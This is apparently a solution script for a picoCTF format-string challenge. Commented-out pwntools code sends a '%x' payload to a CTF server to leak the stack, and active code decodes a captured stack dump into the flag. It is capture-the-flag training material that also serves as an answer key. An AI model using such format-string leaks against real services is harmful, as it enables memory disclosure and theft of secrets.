#!/usr/bin/python3

# import pwntools
# from pwn import *

# # string to write to
# s = ""

# # open up remote connection
# r = remote('mercury.picoctf.net', 53437)

# # get to vulnerability
# r.recvuntil("View my")
# r.send("1\n")
# r.recvuntil("What is your API token?\n")

# # send string to print stack
# r.send("%x" + "-%x"*40 + "\n")

# # receive until the line we want
# r.recvline()

# # read in line
# x = r.recvline()

'''
- NOTE
This function reads the flag onto the stack and then asks the user to enter input before printing it using printf.
Based on this we know that this is a format string vulnerability and that we want to read off of the stack.

'''

x = b'92483d0-804b000-80489c3-f7eecd80-ffffffff-1-9246160-f7efa110-f7eecdc7-0-9247180-1-92483b0-92483d0-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-62633763-65616336-ff9f007d-f7f27af8-f7efa440-c0f02800-1-0-f7d89be9-f7efb0c0-f7eec5c0-f7eec000-ff9fdb18-f7d7a58d-f7eec5c0-8048eca-ff9fdb24-0-f7f0ef09-804b000-f7eec000-f7eece20-ff9fdb58-f7f14d50-f7eed890-c0f02800-f7eec000-804b000-ff9fdb58-8048c86'

# remove unwanted components
x = x[:-1].decode()
s = ''

# parse to characters
for i in x.split('-'):
	if len(i) == 8:
		a = bytearray.fromhex(i)

		for b in reversed(a):
			if b > 32 and b < 128:
				s += chr(b)

# print string
print(s)